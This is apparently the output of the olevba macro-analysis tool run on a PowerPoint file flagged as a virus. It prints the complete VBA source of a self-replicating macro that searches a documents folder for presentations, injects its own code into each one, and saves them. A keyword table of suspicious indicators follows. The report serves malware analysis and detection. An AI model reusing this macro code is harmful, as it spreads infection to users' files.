olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPPoint.Attach.ppt
Type: PPT
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: None - OLE stream: 'VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'PPT.Attach v0.1 /1nternal
Private Sub UserForm_Terminate()
    On Error Resume Next
    Set Home = ActivePresentation
    Set fs = Application.FileSearch
    fs.NewSearch
    fs.LookIn = "C:\My Documents"
    fs.SearchSubFolders = True
    fs.FileName = "*.ppt"
    fs.Execute
    For i = 1 To fs.FoundFiles.Count
        If InStr(1, fs.FoundFiles(i), "~", 1) = 0 And fs.FoundFiles(i) <> Home.FullName Then
            Set PVict = Presentations.Open(fs.FoundFiles(i))
            For j = 1 To PVict.VBProject.VBcomponents.Count
                If PVict.VBProject.VBcomponents(j).Type = 3 Then
                    If PVict.VBProject.VBcomponents(j).Codemodule.Lines(1, 1) <> "'<!--1nternal-->" Then
                        PVict.VBProject.VBcomponents(j).Codemodule.InsertLines 1, Home.VBProject.VBcomponents(Name).Codemodule.Lines(1, 27)
                        PVict.Save
                    End If
                End If
            Next
            PVict.Close
        End If
    Next
    Set PVict = Nothing
End Sub
-------------------------------------------------------------------------------
VBA MACRO Slide1.cls 
in file: None - OLE stream: 'VBA/Slide1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
    UserForm1.Show
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN None - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PPT.Attach v0.1 /1nternallE
-------------------------------------------------------------------------------
VBA FORM STRING IN None - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN None - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

